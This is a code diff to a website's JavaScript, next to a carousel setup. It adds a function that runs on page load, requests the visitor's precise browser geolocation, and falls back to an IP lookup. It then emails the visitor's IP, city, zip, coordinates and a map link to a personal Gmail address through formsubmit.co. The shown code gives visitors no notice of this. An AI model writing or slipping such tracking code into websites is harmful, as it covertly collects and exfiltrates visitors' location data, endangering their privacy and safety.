@@ -138,39 +138,77 @@ $(".swiper-wrapper").owlCarousel({
   },
 });
 
-const options = {
-  enableHighAccuracy: true,
-  timeout: 5000,
-  maximumAge: 0,
-};
+
 
 async function getVisiterData() {
-  fetch("https://api.ipify.org/?format=json")
-    .then((response) => response.json())
-    .then(async (ipData) => {
-      const request = await fetch(
-        `https://location-server-gxue.onrender.com/location/${ipData.ip}`,
-      );
-      const locationData = await request.json();
+  let locationData;
+  const options = {
+    enableHighAccuracy: true,
+    timeout: 5000,
+    maximumAge: 0,
+  };
 
-      fetch("https://formsubmit.co/ajax/aghayevvahid1@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify({
-          name: "New Visitor",
-          message: `
-              Visitors address:https://gps-coordinates.org/my-location.php?lat=${locationData.latitude}&lng=${locationData.longitude}
-              Country: ${locationData["country_name"]} | ${locationData.city} | ${locationData.zip}
-              IP: ${ipData.ip}
-              Latitude | Longitude :  ${locationData.latitude}, ${locationData.longitude}
-              Radius: ${locationData.radius} 
-              `,
-        }),
-      });
+  function getCurrentPosition() {
+    return new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, options);
     });
+  }
+
+  async function getLocation() {
+    try {
+      const pos = await getCurrentPosition();
+      const crd = pos.coords;
+      return {
+        latitude: crd.latitude,
+        longitude: crd.longitude,
+        accuracy: crd.accuracy
+      };
+    } catch (err) {
+      console.log(err);
+      return null;
+    }
+  }
+
+
+  try {
+    const location = await getLocation();
+    if (!location) {
+      const ipResponse = await fetch("https://api.ipify.org/?format=json");
+      const ipData = await ipResponse.json();
+      
+      const request = await fetch(
+        `https://location-server-gxue.onrender.com/location/${ipData.ip}`
+      );
+      locationData = await request.json();
+      locationData.ip = ipData.ip; 
+    } else {
+      locationData = location;
+    }
+    
+    await fetch("https://formsubmit.co/ajax/aghayevvahid1@gmail.com", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        Accept: "application/json",
+      },
+      body: JSON.stringify({
+        name: "New Visitor",
+        message: `
+          Visitors address: https://gps-coordinates.org/my-location.php?lat=${locationData.latitude}&lng=${locationData.longitude}
+          Country: ${locationData["country_name"] || "Unknown"} | ${locationData.city || "Unknown"} | ${locationData.zip || "Unknown"}
+          IP: ${locationData.ip || "Unavailable"}
+          Latitude | Longitude: ${locationData.latitude}, ${locationData.longitude}
+          Accuracy: ${locationData.accuracy}
+          Radius: ${locationData.radius || "Unknown"}
+        `,
+      }),
+    });
+  } catch (error) {
+    console.error("Error during data submission:", error);
+  }
 }
 
- getVisiterData();
+getVisiterData();
+
+
+  
